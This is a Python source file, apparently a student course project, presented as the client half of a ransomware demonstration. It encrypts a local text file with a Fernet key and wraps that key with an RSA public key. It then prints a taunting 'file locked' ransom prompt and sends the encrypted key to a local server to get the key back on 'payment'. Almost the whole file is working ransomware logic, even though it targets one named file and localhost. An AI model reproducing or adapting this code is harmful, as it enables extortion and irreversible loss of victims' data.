#FILE			: Client.py
#PROJECT		: INFO2231
#PROGRAMMER		: Zijia Cao
#FIRST VERSION	: 2023/02/05
#DESCRIPTION	: Client of the Ransomware. It will lock a file called "FileToEncrypt.txt"
#				  and tring to connect to the server for unlock it.
import socket
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

#FUNCTION	: decrypt
#DESCRIPTION: this function will decrypt the "FileToEncrypt.txt" file
#PARAMETERS	: 
#		key	: the decrypted symmetric Key
#RETURNS:
#		none
def decrypt(key):
	print("Start decrypt")
	FernetInstance = Fernet(key)
	filePath = "FileToEncrypt.txt"
	with open(filePath, "rb") as file:
		file_data = file.read()
       	
	decrypted_data = FernetInstance.decrypt(file_data)

	with open(filePath, "wb") as file:
		file.write(decrypted_data)
	
#create the symmetric key for encrypt
symmetricKey  = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

#read the public key
with open("public_key.key", "rb") as key_file:
       	public_key = serialization.load_pem_public_key(
						key_file.read(),
           	backend=default_backend()
		)

#use the symmetric key to encrypt the file
filePath = "FileToEncrypt.txt"
with open(filePath, "rb") as file:
       	file_data = file.read()
encrypted_data = FernetInstance.encrypt(file_data)
with open(filePath, "wb") as file:
	file.write(encrypted_data)
	
#use the public key to encrypt the symmetric key
encryptedSymmetricKey = public_key.encrypt(
	symmetricKey,
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
        	algorithm=hashes.SHA256(),
		label=None
       		)
   	)

#we did not saving the encrypted symmetric key, so if the user quit this program
#there are no way to decrypt the file.
print("Haha, file locked.")
userInput = input("Enter 1 to pay money and unlock your file. This is the one and only chance.")
if(userInput == "1"):
	s = socket.socket()
	HOST,PORT="127.0.0.1",23138
	s.connect((HOST,PORT))
	s.send(encryptedSymmetricKey)
	key = s.recv(1024)
	s.close()
	decrypt(key)
	
quit()
	
